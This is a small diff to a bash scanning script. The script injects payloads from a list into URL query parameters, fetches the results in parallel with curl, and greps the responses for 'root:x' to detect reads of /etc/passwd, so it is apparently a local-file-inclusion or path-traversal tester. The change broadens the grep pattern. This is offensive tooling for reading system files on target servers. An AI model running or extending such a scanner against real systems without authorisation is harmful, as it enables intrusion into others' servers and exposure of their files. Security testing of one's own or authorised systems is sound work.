@@ -39,7 +39,7 @@ for j in $(cat $payload); do
 echo "$url" | qsreplace "$j" | tee -a tempredirect.txt
 done
 for k in $(cat tempredirect.txt);do
-	echo "$k" | xargs -P30 -n1 curl|grep "root:x" &>/dev/null && echo -e "$k" | tee -a resulttemp.txt
+	echo "$k" | xargs -P30 -n1 curl|egrep "root:x|demon|root" &>/dev/null && echo -e "$k" | tee -a resulttemp.txt
 done
 clear
 banner
